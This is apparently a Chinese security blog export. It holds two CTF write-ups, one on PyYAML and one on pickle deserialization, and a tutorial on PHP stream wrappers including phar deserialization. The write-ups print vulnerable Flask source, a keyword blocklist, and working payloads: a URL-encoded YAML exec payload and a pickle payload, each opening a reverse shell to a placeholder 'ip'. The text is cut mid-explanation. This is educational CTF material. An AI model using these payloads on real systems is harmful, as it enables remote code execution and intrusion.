href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            uploaded_file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>            <span class="hljs-keyword">if</span> uploaded_file <span class="hljs-keyword">and</span> is_yaml_file(uploaded_file.filename):<br>                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)<br>                uploaded_file.save(file_path)<br><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;uploaded successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Just YAML file&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Yam1&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Yam1</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;uploads/<span class="hljs-subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_content = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf(file_content):<br>            test = yaml.load(file_content)<br>            <span class="hljs-built_in">print</span>(test)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br><br><br></code></pre></td></tr></table></figure><p>看源码是YAML反序列化。。。不太会后面应该会写一篇博客学习一下 参考<a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/</a></p><p>ban了好多常规的函数尝试绕过吧，编码绕过</p><p>可以发现是直接使用的<code>yaml.load</code>应该是&lt;5.1版本的，高版本要使用构造器</p><p>可以发现exec函数是没有过滤的</p><p>尝试使用exec构建解码器执行命令</p><p>命令：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;python3 -c \&#x27;</span>import os,pty,socket;s=socket.<span class="hljs-built_in">socket</span>();s.<span class="hljs-built_in">connect</span>((<span class="hljs-string">&quot;ip&quot;</span>,<span class="hljs-number">32800</span>));[os.<span class="hljs-built_in">dup2</span>(s.<span class="hljs-built_in">fileno</span>(),f)for f <span class="hljs-built_in">in</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.<span class="hljs-built_in">spawn</span>(<span class="hljs-string">&quot;sh&quot;</span>)\<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在url编码上传执行就可以</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/new:type</span><br><span class="hljs-attr">args:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">exp</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-type">!!python/tuple</span> []<br>  <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">&quot;extend&quot;:</span> <span class="hljs-type">!!python/name:exec</span> &#125;<br><span class="hljs-attr">listitems:</span> <span class="hljs-string">&quot;import urllib; exec(urllib.parse.unquote(&#x27;%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%69%70%22%2c%33%32%38%30%30%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%29%66%6f%72%20%66%20%69%6e%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%5c%27%27%29&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>学习大佬博客： </p><p><a href="https://www.tr0y.wang/s">https://www.tr0y.wang/s</a></p><p><a href="https://lisien11.xyz/">https://lisien11.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PyYAML</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP伪协议</title>
    <link href="/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>介绍php常见的伪协议</p><h1 id="php-协议族"><a href="#php-协议族" class="headerlink" title="php:&#x2F;&#x2F; 协议族"></a>php:&#x2F;&#x2F; 协议族</h1><p>这些协议用于访问 PHP 的输入&#x2F;输出流、内存、临时文件等资源</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><strong><code>php://input</code></strong></h2><p><strong>用途</strong>：读取原始的 HTTP 请求体数据（如 POST,GET 数据）</p><p><strong>实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rawData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><strong><code>php://filter</code></strong></h2><p><strong>用途</strong>：在读写文件时应用过滤器（如编码&#x2F;加密）。</p><p><strong>语法</strong>：<code>php://filter/&lt;过滤器链&gt;/resource=&lt;文件路径&gt;</code></p><p>官方文档：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">名称 描述<br><span class="hljs-attribute">resource</span>=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<br><span class="hljs-attribute">read</span>=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br><span class="hljs-attribute">write</span>=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。<br></code></pre></td></tr></table></figure><h3 id="过滤器："><a href="#过滤器：" class="headerlink" title="过滤器："></a>过滤器：</h3><h3 id="转换过滤器："><a href="#转换过滤器：" class="headerlink" title="转换过滤器："></a>转换过滤器：</h3><h4 id="convert-base64-encode-和-convert-base64-decode"><a href="#convert-base64-encode-和-convert-base64-decode" class="headerlink" title="convert.base64-encode 和 convert.base64-decode"></a>convert.base64-encode 和 convert.base64-decode</h4><p>将读取的数据进行base64转换后输出</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="convert-quoted-printable-encode-和-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-和-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode 和 convert.quoted-printable-decode"></a>convert.quoted-printable-encode 和 convert.quoted-printable-decode</h4><p>将非ascii码的值转换为转换为 <code>=XX</code> 格式的 ASCII 字符串，其中 <code>XX</code> 是该字符的十六进制值。</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;Hello, 世界! =&quot;</span>;<br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/write=convert.quoted-printable-encode/resource=data://text/plain,&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$text</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-comment">//Hello,=20=E4=B8=96=E7=95=8C!=20=3D 中文被转换</span><br></code></pre></td></tr></table></figure><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><blockquote><p>依赖 <code>iconv</code> 扩展，需确保 PHP 已启用该扩展</p></blockquote><p><code>convert.iconv.*</code> 是一个强大的流过滤器（Stream Filter），用于在不同字符编码之间进行转换</p><p><strong>过滤器格式</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">convert.iconv.&lt;输入编码&gt;.&lt;输出编码&gt;<br>或<br>convert.iconv.&lt;输出编码&gt;/&lt;输入编码&gt;<br></code></pre></td></tr></table></figure><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//将 UTF-8 字符串写入为 GBK 文件</span><br><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;你好，世界！&quot;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/write=convert.iconv.utf-8.gbk/resource=output.txt&#x27;</span>,<br>    <span class="hljs-variable">$text</span><br>);<br></code></pre></td></tr></table></figure><h3 id="链式过滤器"><a href="#链式过滤器" class="headerlink" title="链式过滤器"></a><strong>链式过滤器</strong></h3><p>不同的过滤器可以用管道符连接做一个链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 先解码 Base64，再转换编码（假设原始数据是 GBK 编码的 Base64）</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/read=convert.base64-decode|convert.iconv.gbk.utf-8/resource=data.txt&#x27;</span><br>);<br></code></pre></td></tr></table></figure><h1 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><strong><code>zip://</code></strong></h1><p><strong>用途</strong>：读取 ZIP 压缩包中的文件。</p><p><strong>语法</strong>：<code>zip://&lt;压缩包路径&gt;#&lt;内部文件&gt;</code>。</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;zip://archive.zip#file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="data"><a href="#data" class="headerlink" title="data://"></a><strong><code>data://</code></strong></h1><p><strong>介绍</strong>：数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>allow_url_fopen和allow_url_include都需要开启。</p><p><strong>语法</strong>：<code>data:[&lt;MIME类型&gt;][;base64],&lt;数据&gt;</code>。</p><ul><li><strong>MIME 类型</strong>（可选）：指定数据的格式（如 <code>text/plain</code>, <code>image/png</code>），默认是 <code>text/plain</code>。</li><li><strong>base64</strong>（可选标记）：表示数据是 Base64 编码的。</li><li><strong>数据</strong>：原始内容或 Base64 编码后的内容。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SGVsbG8=&#x27;</span>); <span class="hljs-comment">// 输出 &quot;Hello&quot;</span><br></code></pre></td></tr></table></figure><h1 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><strong><code>phar://</code></strong></h1><p><strong>用途</strong>：访问 PHAR（PHP 归档）文件中的内容。</p><p><strong>语法</strong>：<code>phar://&lt;路径&gt;/file.phar/&lt;内部文件&gt;</code>。</p><p><strong>用法</strong>：在反序列化可以用</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/fb3befe87ee638410501d54bc543c8f3.png" alt="来自CSDN块块"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 创建并配置 PHAR</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br> <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar&#x27;</span>;      <span class="hljs-comment">#phar协议，phar.phar包，</span><br>  <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);     <span class="hljs-comment">#受影响的file_exists函数 触发反序列化</span><br></code></pre></td></tr></table></figure><h1 id="glob"><a href="#glob" class="headerlink" title="glob://"></a><strong><code>glob://</code></strong></h1><p><strong>用途</strong>：匹配文件路径模式（如遍历目录）。一般配合原生类使用</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;glob:///path/*.txt&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123; ... &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.23</title>
    <link href="/2025/01/23/2025-1-23/"/>
    <url>/2025/01/23/2025-1-23/</url>
    
    <content type="html"><![CDATA[<h1 id="2024-DASCTF-const-python"><a href="#2024-DASCTF-const-python" class="headerlink" title="2024 DASCTF const_python"></a>2024 DASCTF const_python</h1><p>提示访问&#x2F;src拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;buu.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>在ppicklee路由中存在<code>pickle.loads(pickle_data)</code>就存在pickle反序列化</p><p>过滤了很多命令执行函数，但是subprocess没有被过滤，这里可以利用</p><p>payload1反弹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;csubprocess</span><br><span class="hljs-string">    run</span><br><span class="hljs-string">    p0</span><br><span class="hljs-string">    ((lp1</span><br><span class="hljs-string">    Vbash</span><br><span class="hljs-string">    p2</span><br><span class="hljs-string">    aV-c</span><br><span class="hljs-string">    p3</span><br><span class="hljs-string">    aVbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="hljs-string">    p4</span><br><span class="hljs-string">    atp5</span><br><span class="hljs-string">    Rp6.</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>解释</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">csubprocess\nrun：<br><br>c：表示加载模块。<br>subprocess：导入 Python 标准库中的 subprocess 模块。<br>run：引用 subprocess.run 方法。<br>p0 到 p6：<br><br>p0, p1, p2 等是 pickle 